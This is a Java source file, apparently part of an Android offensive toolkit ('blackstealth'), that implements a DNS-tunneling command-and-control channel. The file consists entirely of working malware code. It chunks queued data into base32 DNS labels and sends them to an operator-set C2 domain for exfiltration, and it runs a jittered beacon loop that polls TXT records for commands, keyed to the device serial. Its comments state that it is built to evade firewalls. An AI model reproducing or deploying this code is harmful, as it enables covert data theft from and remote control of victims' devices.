package com.offensive.blackstealth.c2_channels;

import android.util.Base64;
import android.util.Log;
import java.io.*;
import java.net.*;
import java.nio.ByteBuffer;
import java.util.*;
import java.util.concurrent.*;

/**
 * DNS Tunneling C2 Channel
 * Exfiltrates data through DNS queries to evade firewalls
 * Uses TXT records for data transfer
 */
public class DnsTunnelingC2 {
    private static final String TAG = "DnsTunnelingC2";
    private static final int MAX_LABEL_LENGTH = 63;
    private static final int MAX_QUERY_LENGTH = 253;
    
    private String c2Domain;
    private String dnsServer;
    private int chunkSize = 30; // bytes per DNS label
    private ExecutorService executor;
    private boolean isRunning = false;
    private Queue<byte[]> outboundQueue;
    private C2Callback callback;
    
    public interface C2Callback {
        void onDataReceived(byte[] data);
        void onError(String error);
    }
    
    public DnsTunnelingC2(String c2Domain, String dnsServer) {
        this.c2Domain = c2Domain;
        this.dnsServer = dnsServer;
        this.executor = Executors.newFixedThreadPool(2);
        this.outboundQueue = new ConcurrentLinkedQueue<>();
    }
    
    public void setCallback(C2Callback callback) {
        this.callback = callback;
    }
    
    public void start() {
        if (isRunning) return;
        isRunning = true;
        
        // Start sender thread
        executor.submit(this::senderLoop);
        
        // Start receiver/beacon thread
        executor.submit(this::beaconLoop);
        
        Log.i(TAG, "DNS tunneling started for " + c2Domain);
    }
    
    public void stop() {
        isRunning = false;
        executor.shutdownNow();
    }
    
    /**
     * Queue data for exfiltration
     */
    public void sendData(byte[] data) {
        outboundQueue.add(data);
    }
    
    public void sendData(String data) {
        sendData(data.getBytes());
    }
    
    /**
     * Sender loop - processes outbound queue
     */
    private void senderLoop() {
        while (isRunning) {
            try {
                byte[] data = outboundQueue.poll();
                if (data != null) {
                    sendViaDns(data);
                }
                Thread.sleep(100);
            } catch (Exception e) {
                if (callback != null) callback.onError(e.getMessage());
            }
        }
    }
    
    /**
     * Beacon loop - polls C2 for commands
     */
    private void beaconLoop() {
        while (isRunning) {
            try {
                byte[] response = beacon();
                if (response != null && response.length > 0) {
                    if (callback != null) callback.onDataReceived(response);
                }
                // Random jitter 30-60 seconds
                Thread.sleep(30000 + (long)(Math.random() * 30000));
            } catch (Exception e) {
                if (callback != null) callback.onError(e.getMessage());
            }
        }
    }
    
    /**
     * Send data via DNS TXT query
     */
    private void sendViaDns(byte[] data) throws Exception {
        // Encode data as base32 (DNS-safe)
        String encoded = base32Encode(data);
        
        // Split into chunks
        List<String> chunks = splitIntoChunks(encoded);
        
        // Generate transaction ID
        String txId = generateTxId();
        
        // Send each chunk
        for (int i = 0; i < chunks.size(); i++) {
            String query = String.format("%s.%d.%d.%s.data.%s", 
                chunks.get(i), i, chunks.size(), txId, c2Domain);
            
            performDnsQuery(query, "TXT");
            Thread.sleep(50); // Small delay between queries
        }
    }
    
    /**
     * Beacon to C2 and receive commands
     */
    private byte[] beacon() throws Exception {
        String deviceId = getDeviceId();
        String query = String.format("%s.beacon.%s", deviceId, c2Domain);
        
        String response = performDnsQuery(query, "TXT");
        
        if (response != null && !response.isEmpty() && !response.equals("NOOP")) {
            // Decode base32 response
            return base32Decode(response.replace("\"", "").trim());
        }
        return null;
    }
    
    /**
     * Perform DNS query and get response
     */
    private String performDnsQuery(String hostname, String recordType) throws Exception {
        DatagramSocket socket = new DatagramSocket();
        socket.setSoTimeout(5000);
        
        try {
            // Build DNS query packet
            byte[] query = buildDnsQuery(hostname, recordType);
            
            InetAddress dnsAddr = InetAddress.getByName(dnsServer);
            DatagramPacket packet = new DatagramPacket(query, query.length, dnsAddr, 53);
            socket.send(packet);
            
            // Receive response
            byte[] buffer = new byte[512];
            DatagramPacket response = new DatagramPacket(buffer, buffer.length);
            socket.receive(response);
            
            // Parse response
            return parseDnsResponse(response.getData(), response.getLength(), recordType);
            
        } finally {
            socket.close();
        }
    }
    
    /**
     * Build DNS query packet
     */
    private byte[] buildDnsQuery(String hostname, String recordType) {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        DataOutputStream dos = new DataOutputStream(baos);
        
        try {
            // Transaction ID
            short txId = (short)(Math.random() * 65535);
            dos.writeShort(txId);
            
            // Flags: standard query, recursion desired
            dos.writeShort(0x0100);
            
            // Questions: 1, Answers: 0, Authority: 0, Additional: 0
            dos.writeShort(1);
            dos.writeShort(0);
            dos.writeShort(0);
            dos.writeShort(0);
            
            // QNAME - domain name
            String[] labels = hostname.split("\\.");
            for (String label : labels) {
                dos.writeByte(label.length());
                dos.writeBytes(label);
            }
            dos.writeByte(0); // End of QNAME
            
            // QTYPE
            if (recordType.equals("TXT")) {
                dos.writeShort(16); // TXT
            } else if (recordType.equals("A")) {
                dos.writeShort(1);  // A
            } else {
                dos.writeShort(16); // Default TXT
            }
            
            // QCLASS: IN (Internet)
            dos.writeShort(1);
            
        } catch (IOException e) {
            Log.e(TAG, "Error building DNS query: " + e.getMessage());
        }
        
        return baos.toByteArray();
    }
    
    /**
     * Parse DNS response
     */
    private String parseDnsResponse(byte[] data, int length, String recordType) {
        try {
            ByteBuffer buffer = ByteBuffer.wrap(data, 0, length);
            
            // Skip header (12 bytes)
            buffer.position(12);
            
            // Skip question section
            while (buffer.get() != 0); // Skip QNAME
            buffer.getShort(); // QTYPE
            buffer.getShort(); // QCLASS
            
            // Parse answer section
            if (buffer.remaining() < 12) return null;
            
            // Skip NAME (pointer or labels)
            int nameField = buffer.getShort() & 0xFFFF;
            
            int type = buffer.getShort() & 0xFFFF;
            buffer.getShort(); // CLASS
            buffer.getInt();   // TTL
            int rdLength = buffer.getShort() & 0xFFFF;
            
            if (type == 16 && rdLength > 0) { // TXT record
                int txtLength = buffer.get() & 0xFF;
                byte[] txtData = new byte[txtLength];
                buffer.get(txtData);
                return new String(txtData);
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error parsing DNS response: " + e.getMessage());
        }
        return null;
    }
    
    /**
     * Split encoded data into DNS-safe chunks
     */
    private List<String> splitIntoChunks(String data) {
        List<String> chunks = new ArrayList<>();
        for (int i = 0; i < data.length(); i += chunkSize) {
            chunks.add(data.substring(i, Math.min(i + chunkSize, data.length())));
        }
        return chunks;
    }
    
    /**
     * Base32 encode (DNS-safe alphabet)
     */
    private String base32Encode(byte[] data) {
        String alphabet = "abcdefghijklmnopqrstuvwxyz234567";
        StringBuilder result = new StringBuilder();
        
        int buffer = 0;
        int bitsLeft = 0;
        
        for (byte b : data) {
            buffer = (buffer << 8) | (b & 0xFF);
            bitsLeft += 8;
            
            while (bitsLeft >= 5) {
                int index = (buffer >> (bitsLeft - 5)) & 0x1F;
                result.append(alphabet.charAt(index));
                bitsLeft -= 5;
            }
        }
        
        if (bitsLeft > 0) {
            int index = (buffer << (5 - bitsLeft)) & 0x1F;
            result.append(alphabet.charAt(index));
        }
        
        return result.toString();
    }
    
    /**
     * Base32 decode
     */
    private byte[] base32Decode(String data) {
        String alphabet = "abcdefghijklmnopqrstuvwxyz234567";
        ByteArrayOutputStream result = new ByteArrayOutputStream();
        
        int buffer = 0;
        int bitsLeft = 0;
        
        for (char c : data.toLowerCase().toCharArray()) {
            int value = alphabet.indexOf(c);
            if (value < 0) continue;
            
            buffer = (buffer << 5) | value;
            bitsLeft += 5;
            
            if (bitsLeft >= 8) {
                result.write((buffer >> (bitsLeft - 8)) & 0xFF);
                bitsLeft -= 8;
            }
        }
        
        return result.toByteArray();
    }
    
    private String generateTxId() {
        return String.format("%08x", (int)(Math.random() * Integer.MAX_VALUE));
    }
    
    private String getDeviceId() {
        return String.format("%08x", android.os.Build.SERIAL.hashCode());
    }
}
